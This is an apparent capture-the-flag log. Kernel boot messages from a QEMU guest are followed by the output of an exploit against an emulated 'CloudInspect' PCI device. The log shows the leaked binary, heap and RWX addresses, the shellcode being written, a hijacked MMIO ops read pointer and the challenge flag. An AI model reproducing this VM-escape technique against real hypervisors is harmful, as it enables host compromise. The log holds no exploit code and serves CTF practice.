b'[    2.346663] blacklist: Loading compiled-in revocation X.509 certificates\r\r\n'
b"[    2.349345] Loaded X.509 cert 'Canonical Ltd. Secure Boot Signing: 61482aa2830d0ab2ad5af10b7250da9033ddcef0'\r\r\n"
b'[    2.356034] zswap: loaded using pool lzo/zbud\r\r\n'
b'[    2.364128] Key type ._fscrypt registered\r\r\n'
b'[    2.364324] Key type .fscrypt registered\r\r\n'
b'[    2.364659] Key type fscrypt-provisioning registered\r\r\n'
b'[    2.370845] ata2.00: ATA-7: QEMU HARDDISK, 2.5+, max UDMA/100\r\r\n'
b'[    2.371068] ata2.00: 95 sectors, multi 16: LBA48 \r\r\n'
b'[    2.390707] scsi 1:0:0:0: Direct-Access     ATA      QEMU HARDDISK    2.5+ PQ: 0 ANSI: 5\r\r\n'
b'[    2.395072] Key type encrypted registered\r\r\n'
b'[    2.395376] AppArmor: AppArmor sha1 policy hashing enabled\r\r\n'
b'[    2.396781] ima: No TPM chip found, activating TPM-bypass!\r\r\n'
b'[    2.397225] ima: Allocated hash algorithm: sha1\r\r\n'
b'[    2.406867] ima: No architecture policies found\r\r\n'
b'[    2.411242] sd 1:0:0:0: [sda] 95 512-byte logical blocks: (48.6 kB/47.5 KiB)\r\r\n'
b'[    2.412675] evm: Initialising EVM extended attributes:\r\r\n'
b'[    2.412884] evm: security.selinux\r\r\n'
b'[    2.413042] evm: security.SMACK64\r\r\n'
b'[    2.413181] evm: security.SMACK64EXEC\r\r\n'
b'[    2.413331] evm: security.SMACK64TRANSMUTE\r\r\n'
b'[    2.413532] evm: security.SMACK64MMAP\r\r\n'
b'[    2.413677] evm: security.apparmor\r\r\n'
b'[    2.413819] evm: security.ima\r\r\n'
b'[    2.413935] evm: security.capability\r\r\n'
b'[    2.414106] evm: HMAC attrs: 0x1\r\r\n'
b'[    2.416040] sd 1:0:0:0: Attached scsi generic sg0 type 0\r\r\n'
b'[    2.418452] sd 1:0:0:0: [sda] Write Protect is off\r\r\n'
b"[    2.419977] sd 1:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn't support DPO or FUA\r\r\n"
b'[    2.432357] PM:   Magic number: 13:463:800\r\r\n'
b'[    2.454232] RAS: Correctable Errors collector initialized.\r\r\n'
b'[    2.494806] sd 1:0:0:0: [sda] Attached SCSI disk\r\r\n'
b'[    2.507341] Freeing unused decrypted memory: 2036K\r\r\n'
b'[    2.586812] Freeing unused kernel image (initmem) memory: 2688K\r\r\n'
b'[    2.587512] Write protecting the kernel read-only data: 22528k\r\r\n'
b'[    2.592531] Freeing unused kernel image (text/rodata gap) memory: 2036K\r\r\n'
b'[    2.594482] Freeing unused kernel image (rodata/data gap) memory: 684K\r\r\n'
b'[    2.794973] x86/mm: Checked W+X mappings: passed, no W+X pages found.\r\r\n'
b'[    2.796103] Run /init as init process\r\r\n'
b"\rstarting pid 114, tty '': '/etc/init.d/rcS'[    2.873090] tsc: Refined TSC clocksource calibration: 2394.459 MHz\r\r\n"
b'[    2.873887] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2283c51f836, max_idle_ns: 440795218683 ns\r\r\n'
b'[    2.874713] clocksource: Switched to clocksource tsc\r\r\n'
b'\r\r\n'
b"\rstarting pid 121, tty '/dev/ttyS0': '/controller'\r\r\n"
b'iomem @ 0x7f2d5f21c000\r\r\n'
b'DMA buffer (virt) @ 0x98a000\r\r\n'
b'DMA buffer (phys) @ 0x5a1a000\r\r\n'
b'[*] ops_struct: 56026e9d2f20\r\r\n'
b'[*] Binary base address: 56026dff0000\r\r\n'
b'[*] Heap base address: 56026f302fc0\r\r\n'
b'[*] Leak rwx: 7f6f10000000\r\r\n'
b'[*] Addr obj: 56027023fd88\r\r\n'
b'[*] Writing the shellcode @ 7f6f10001000\r\r\n'
b'[*] reading struct mmio.MemoryRegionOps @ 56026e9d2f20\r\r\n'
b'[*] fake_ops.read = 7f6f10001000\r\r\n'
b'[*] CloudInspectState.mmio.ops = &fake_ops [7f6f10002000]\r\r\n'
b'[*] CloudInspectState.mmio.ops.read () => jmp @ 7f6f10001000\r\r\n'
b'[*] CloudInspectState.mmio.ops = original ops\r\r\n'
b'[*] Reading the flag @ 7f6f10005000\r\r\n'
b'flag: flag{cloudinspect_inspects_your_cloud_0107}\r\r\n'
flag: flag @ 7f6f10005000
flag: flag{cloudinspect_inspects_your_cloud_0107}
[*] Closed connection to flu.xxx port 20065
'''